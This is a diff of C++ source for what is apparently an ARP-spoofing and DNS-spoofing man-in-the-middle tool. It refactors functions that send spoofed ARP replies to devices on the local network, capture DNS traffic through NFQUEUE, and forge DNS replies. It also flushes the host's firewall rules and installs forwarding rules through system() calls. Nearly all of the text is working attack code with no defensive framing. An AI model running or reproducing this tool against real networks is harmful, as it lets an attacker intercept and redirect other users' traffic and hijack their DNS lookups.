@@ -12,16 +12,16 @@ void handle_sigint(int sig) {
 
 void send_data_udp(char *data, int len, struct NFQData *info) {
     // raw socket
-    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    int fd;
     // int fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (fd < 0) {
+    if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0) {
         perror("socket()");
         return;
     }
 
-    uint32_t my_ip = info->local_info.src_ip.sin_addr.s_addr;
-    int ifidx = info->local_info.device.sll_ifindex;
-    std::array<uint8_t, 6> src_mac = info->local_info.src_mac;
+    uint32_t my_ip = info->info.src_ip.sin_addr.s_addr;
+    int ifidx = info->info.device.sll_ifindex;
+    std::vector<uint8_t> src_mac = info->info.src_mac;
     unsigned char my_mac[6];
     std::copy(src_mac.begin(), src_mac.end(), my_mac);
     // dump ifidx, src_mac, my_ip
@@ -31,12 +31,12 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
         printf("%02x ", my_mac[i]);
     }
     printf("\n");
-    printf("my_ip: %s\n", inet_ntoa(info->local_info.src_ip.sin_addr));
+    printf("my_ip: %s\n", inet_ntoa(info->info.src_ip.sin_addr));
 
     char *sendbuf = new char[1024];
     memset(sendbuf, 0, 1024);
     struct ethhdr *eth = (struct ethhdr *)sendbuf;
-    std::array<uint8_t, 4> dest_ip_array;
+    std::vector<uint8_t> dest_ip_array(4);
     for (int i = 0; i < 4; i++) {
         dest_ip_array[i] = data[16 + i];
     }
@@ -178,14 +178,14 @@ void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *i
 }
 
 // Function to handle receiving responses
-void receiveHandler(int sd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
+void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
     int saddr_len = sizeof(saddr);
 
     while (true) {
         // Receive packet
-        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
+        int bytes = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
         if (bytes < 0) {
             perror("recvfrom() failed");
             exit(EXIT_FAILURE);
@@ -261,7 +261,7 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
     return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
 }
 
-void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
+void NFQHandler(AccessInfo info, std::map<std::vector<uint8_t>, std::vector<uint8_t>> ip_mac_pairs) {
     struct nfq_handle *h;
     struct nfq_q_handle *qh;
     struct nfnl_handle *nh;
@@ -270,7 +270,7 @@ void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, st
     char buf[4096] __attribute__((aligned));
 
     struct NFQData nfq_data;
-    nfq_data.local_info = local_info;
+    nfq_data.info = info;
     nfq_data.ip_mac_pairs = ip_mac_pairs;
 
     h = nfq_open();
@@ -304,65 +304,30 @@ void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, st
 }
 
 int main(int argc, char **argv) {
-    char *interface;
     struct ifreq ifr;
-    int sd;
+    int sockfd;
+    AccessInfo info;
 
-    struct LocalInfo local_info;
-
-    if (argc != 2) {
-        printf("Usage: %s <interface>\n", argv[0]);
-        exit(EXIT_FAILURE);
-    }
-
-    // Interface to send packet through.
-    interface = argv[1];
-
-    // Get source IP address.
-    getSourceIP(interface, local_info.src_ip);
-
-    // Get source MAC address.
-    getMACAddress(interface, local_info.src_mac);
-
-    // Get netmask.
-    getMask(interface, local_info.netmask);
-
-    // Get default gateway.
-    getDefaultGateway(interface, local_info.gateway_ip);
-
-    // Find interface index from interface name and store index in
-    // struct sockaddr_ll device, which will be used as an argument of sendto().
-    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
-        perror("if_nametoindex() failed to obtain interface index");
-        exit(EXIT_FAILURE);
-    }
-#ifdef INFO
-    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
-    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
-    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
-    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
-    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
-#endif
+    info.getInfo(); // get all info including interface name
 
     // Submit request for a raw socket descriptor.
-    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
+    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
         perror("socket() failed");
         exit(EXIT_FAILURE);
     }
 
-    sendARPRequest(sd, local_info);
+    sendARPRequest(sockfd, info);
 
     // Use a table to save IP-MAC pairs
-    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;
+    std::map<std::vector<uint8_t>, std::vector<uint8_t>> ip_mac_pairs;
 
     printf("Available devices\n");
     printf("-----------------------------------------\n");
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    // Start the threads
-    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
-    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
+    std::thread send_thread(sendSpoofedARPReply, sockfd, std::ref(ip_mac_pairs), info);
+    std::thread receive_thread(receiveHandler, sockfd, std::ref(ip_mac_pairs), info);
 
     signal(SIGINT, handle_sigint);
 
@@ -370,20 +335,20 @@ int main(int argc, char **argv) {
     system("iptables -F");
     system("iptables -F -t nat");
     char cmd[100];
-    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
+    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", info.interface);
     system(cmd);
     system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
     system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
 
     // Start the NFQHandler
-    NFQHandler(local_info, ip_mac_pairs);
+    NFQHandler(info, ip_mac_pairs);
 
     // Wait for threads to finish
     send_thread.join();
     receive_thread.join();
 
     // Close socket descriptor.
-    close(sd);
+    close(sockfd);
 
     return (EXIT_SUCCESS);
 }
